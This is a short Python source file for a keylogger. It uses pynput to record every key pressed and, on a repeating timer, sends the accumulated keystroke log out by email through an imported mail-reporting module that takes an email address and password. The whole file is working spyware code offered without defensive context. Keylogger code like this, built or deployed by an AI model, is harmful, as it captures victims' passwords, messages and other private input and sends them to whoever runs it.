import pynput.keyboard
import threading
import Mail_Send

class Keylogger:

    def __init__(self, time_interval,email,password):
        self.log = ""
        self.interval = time_interval
        self.mail_report = Mail_Send.Report_On_Mail(email,password)

    def append_to_log(self, string):
        self.log = self.log + string

    def key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)
    def report(self):
        self.mail_report.send_mail(self.log)
        self.log = ""
        timer = threading.Timer(self.interval,self.report)
        timer.start()
    def start(self):
        listener = pynput.keyboard.Listener(on_press=self.key_press)
        with listener:
            self.report()
            listener.join()